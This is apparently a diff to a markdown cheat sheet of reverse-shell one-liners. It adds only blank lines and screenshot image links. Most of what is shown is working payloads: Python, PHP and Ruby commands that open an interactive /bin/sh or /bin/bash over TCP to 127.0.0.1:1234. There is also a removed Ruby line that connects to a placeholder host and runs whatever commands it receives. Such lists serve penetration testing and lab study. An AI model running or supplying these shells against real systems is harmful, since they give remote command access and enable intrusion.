@@ -90,20 +90,32 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
+
+
 ```
+
+![agent](../images/WechatIMG54.jpeg)
+
+
 
 ```php
 php -r 'exec("/bin/bash -i >& /dev/tcp/127.0.0.1/1234")'
+
+
 ```
+![agent](../images/WechatIMG53.jpeg)
+
 
 ```ruby
 
 ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
-ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-
 
 ```
+
+![agent](../images/WechatIMG54.jpeg)
+
+
 
 ```bash
 
